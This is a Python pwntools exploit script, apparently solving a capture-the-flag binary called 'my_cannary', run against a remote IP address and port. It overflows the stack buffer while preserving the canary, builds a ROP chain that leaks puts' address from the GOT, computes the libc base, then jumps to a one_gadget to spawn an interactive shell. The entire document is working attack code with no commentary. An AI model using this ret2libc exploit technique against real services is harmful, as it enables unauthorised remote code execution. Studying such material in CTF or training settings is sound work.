from pwn import *

context.terminal = ['gnome-terminal','-x','sh','-c']
io=remote('183.129.189.60',10026)
#io=process('./my_cannary')

pop_rdi=0x400a43
puts_got=0x0601018
puts_plt=0x400670 

def debug(addr = '0x040093C'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

#debug()
pl1='a'*0x30+p64(0x4008EA)+p64(0x50ec8348e5894855)+'bbbbbbbb'+p64(pop_rdi)+p64(0x0601018)+p64(puts_plt)+p64(0x04008EA)
io.send(pl1)
io.recvuntil(' begin\n')
puts_add=u64(io.recv(6).ljust(8,'\x00'))
print(hex(puts_add))
libc_base=puts_add-0x06f690

pl2='a'*0x30+p64(0x4008EA)+p64(0x50ec8348e5894855)+'bbbbbbbb'+p64(libc_base+0xf02a4)
io.send(pl2)

io.interactive()